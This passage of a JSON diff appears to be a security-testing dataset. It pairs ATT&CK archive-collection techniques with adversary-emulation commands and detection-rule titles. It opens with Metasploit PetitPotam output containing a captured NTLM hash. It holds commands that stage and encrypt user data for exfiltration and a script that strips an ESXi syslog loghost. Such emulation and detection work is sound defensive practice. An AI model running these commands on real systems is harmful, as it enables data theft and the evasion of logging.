WIN-3MSP8K2LCGC$::MSFLAB:cd561910093ed145:aeaef46507cc87aecebb99717d5e8753:01010000000000000022f245ce16d801be5bf7c8b735b582000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008000022f245ce16d80106000400020000000800300030000000000000000000000000400000f12b37e798747bd58bfa63fc5b99630354f0c31717d6ec25bfa2214b4352b8530a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200350030002e003100330034000000000000000000\n\n[+] 192.168.159.96:445    - Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful\n[*] 192.168.159.96:445    - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/dcerpc/petitpotam) >"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1560",
+      "name": "Archive Collected Data",
+      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory",
+      "platforms": [
+        "windows"
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}",
+          "cleanup": "Remove-Item -path #{output_file} -ErrorAction Ignore"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "Compressed File Creation Via Tar.EXE",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration."
+        },
+        {
+          "title": "Compressed File Extraction Via Tar.EXE",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection."
+        }
+      ]
+    },
+    {
+      "technique_id": "T1560.001",
+      "name": "Archive Collected Data: Archive via Utility",
+      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory",
+      "platforms": [
+        "windows",
+        "linux",
+        "macos",
+        "darwin"
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}",
+          "cleanup": "del /f /q /s #{output_file} >nul 2>&1"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir",
+          "cleanup": null
+        },
+        {
+          "executor": "command_prompt",
+          "command": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir",
+          "cleanup": "rmdir /s /Q $PathToAtomicsFolder\\T1560.001\\victim-files >nul 2>&1"
+        },
+        {
+          "executor": "bash",
+          "command": "zip #{output_file} #{input_files}",
+          "cleanup": "rm -f #{output_file}"
+        },
+        {
+          "executor": "sh",
+          "command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})",
+          "cleanup": "rm -f #{input_file}.gz"
+        },
+        {
+          "executor": "sh",
+          "command": "tar -cvzf #{output_file} #{input_file_folder}",
+          "cleanup": "rm -f #{output_file}"
+        },
+        {
+          "executor": "sh",
+          "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}",
+          "cleanup": "rm -Rf #{test_folder}"
+        },
+        {
+          "executor": "bash",
+          "command": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64",
+          "cleanup": "rm -rf #{input_folder}"
+        },
+        {
+          "executor": "powershell",
+          "command": "# Extract line with IP address from the syslog configuration output\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" > c:\\temp\\loghost.txt\n\n# Replace the IP with \"0\"\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\\..\\atomics\\T1560.001\\src\\esxi_remove_loghost.txt\n\n# Extract the IP from the line extracted from findstr\n$inputFilePath = \"c:\\temp\\loghost.txt\"\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\n\n$fileContent = Get-Content -Path $inputFilePath -Raw\n\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\n    Write-Host \"The content is $fileContent\"\n    Write-Host \"The file is empty\"\n} else {\n    # Use a regular expression to extract IP addresses\n    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\n    \n    $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\n\n    $output | Out-File -FilePath $outputFilePath -Encoding ascii\n    \n    Write-Host \"IP addresses extracted and saved to $outputFilePath\"\n}",
+          "cleanup": "# Re-add the initially extracted IP\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\\temp\\loghost_ip.txt\n\nrm c:\\temp\\loghost_ip.txt\nrm c:\\temp\\loghost.txt"
+        },
+        {
+          "executor": "command_prompt",
+          "command": "makecab.exe #{input_file} #{output_file}",
+          "cleanup": "del #{output_file}"
+        },
+        {
+          "executor": "powershell",
+          "command": "$AppData=\"$env:USERPROFILE\\AppData\"\n$Copy=\"#{destination_folder}\"\n$Zip=\"#{zip_file_path}\"\n\nif (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force }\nNew-Item -ItemType Directory -Path $Copy | Out-Null\n\nGet-ChildItem $AppData -Recurse -Force | ForEach-Object {\n  $rel = $_.FullName.Substring($AppData.Length + 1)\n  $dest = Join-Path $Copy $rel\n  if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }\n  else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue }\n}\n\nAdd-Type -AssemblyName System.IO.Compression.FileSystem\n[System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)",
+          "cleanup": null
+        },
+        {
+          "executor": "sh",
+          "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;",
+          "cleanup": "rm #{host.dir.git}.tar.gz;"
+        },
+        {
+          "executor": "psh",
+          "command": "tar -czf #{host.dir.git}.tar.gz -C #{host.dir.git} *; Write-Host #{host.dir.git}.tar.gz; exit 0;",
+          "cleanup": "Remove-Item -Path #{host.dir.git}.tar.gz;"
+        },
+        {
+          "executor": "sh",
+          "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz",
+          "cleanup": "rm #{host.dir.staged}.tar.gz"
+        },
+        {
+          "executor": "psh,pwsh",
+          "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select",
+          "cleanup": "rm #{host.dir.staged}.zip"
+        },
+        {
+          "executor": "sh",
+          "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg",
+          "cleanup": "rm #{host.dir.staged}.tar.gz.gpg"
+        },
+        {
+          "executor": "psh",
+          "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select",
+          "cleanup": "rm #{host.dir.staged}.7z"
+        }
+      ],
+      "detection_rules": [
+        {
+          "title": "7Zip Compressing Dump Files",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of 7z in order to compress a file with a \".dmp\"/\".dump\" extension, which could be a step in a process of dump file exfiltration."
+        },
+        {
+          "title": "Compress Data and Lock With Password for Exfiltration With 7-ZIP",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities"
+        },
+        {
+          "title": "Suspicious Manipulation Of Default Accounts Via Net.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects suspicious manipulations of default accounts such as 'administrator' and 'guest'. For example 'enable' or 'disable' accounts or change the password...etc"
+        },
+        {
+          "title": "Files Added To An Archive Using Rar.EXE",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network."
+        },
+        {
+          "title": "Rar Usage with Password and Compression Level",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects the use of rar.exe, on the command line, to create an archive with password protection or with a specific compression level. This is pretty indicative of malicious actions."
+        },
+        {
+          "title": "Compressed File Creation Via Tar.EXE",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects execution of \"tar.exe\" in order to create a compressed file.\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration."
+        },
+        {
+          "title": "Compressed File Extraction Via Tar.EXE",
+          "logsource": {
+            "product": "windows",
+            "category": "process_creation"
+          },
+          "description": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection."
+        },
+        {
+          "title": "Winrar Compressing Dump Files",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects execution of WinRAR in order to compress a file with a \".dmp\"/\".dump\" extension, which could be a step in a process of dump file exfiltration."
+        },
+        {
+          "title": "WinRAR Execution in Non-Standard Folder",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "Detects a suspicious WinRAR execution in a folder which is not the default installation folder"
+        },
+        {
+          "title": "Compress Data and Lock With Password for Exfiltration With WINZIP",
+          "logsource": {
+            "category": "process_creation",
+            "product": "windows"
+          },
+          "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities"
+        }
+      ]
+    },
+    {
+      "technique_id": "T1560.002",
+      "name": "Archive Collected Data: Archive via Library",
+      "description": "Uses GZip from Python to compress files",
+      "platforms": [
+        "linux"
+      ],
+      "commands": [
+        {
+          "executor": "sh",
+          "command": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"",
+          "cleanup": "rm #{path_to_output_file}"
+        },
+        {
+          "executor": "sh",
+          "command": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"",
+          "cleanup": "rm #{path_to_output_file}"
+        },
+        {
+          "executor": "sh",
+          "command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"",
+          "cleanup": "rm #{path_to_output_file}"
+        },
+        {
+          "executor": "sh",
+          "command": "which_python=`which python || which python3`\n$which_python -c \"import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()\"",
+          "cleanup": "rm #{path_to_output_file}"
+        }
+      ],
+      "detection_rules": []
+    }
+  ]
+}
